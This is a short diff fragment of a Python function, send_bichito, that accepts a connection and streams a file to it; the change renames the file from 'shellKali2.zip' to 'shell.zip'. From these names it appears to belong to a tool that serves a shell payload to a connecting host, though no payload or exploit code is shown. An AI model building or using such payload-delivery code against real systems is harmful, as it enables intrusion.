@@ -66,7 +66,7 @@ def send_bichito(address):
             print('Got connection', a)
             print('Sending bichito...')
             while True:
-                filename='shellKali2.zip'
+                filename='shell.zip'
                 f = open(filename,'rb')
                 l = f.read(8192)
 
